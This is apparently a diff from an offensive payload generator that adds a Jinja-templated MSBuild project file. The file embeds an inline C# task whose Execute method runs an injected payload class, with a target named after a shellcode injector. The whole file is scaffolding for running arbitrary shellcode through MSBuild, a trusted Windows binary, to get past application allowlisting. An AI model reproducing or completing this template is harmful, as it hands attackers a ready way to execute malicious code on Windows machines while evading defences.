@@ -1,0 +1,31 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="{{ v['ShellCodeInjector'] }}">
+   <{{ v['FragmentExample'] }} />   
+  </Target>
+  <UsingTask
+    TaskName="{{ v['FragmentExample'] }}"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>  
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+
+            {{ rendered_imports|indent(12,True) }}
+        
+            public class {{ v['FragmentExample'] }} :  Task, ITask
+            {
+                public override bool Execute()
+                {         
+                    {{ special['payload_main_class_name'] }}.{{ special['payload_main_func_name'] }}();
+                    return true;
+                }
+            }
+
+            {{ rendered_inner_shell|indent(12,True) }}
+      
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
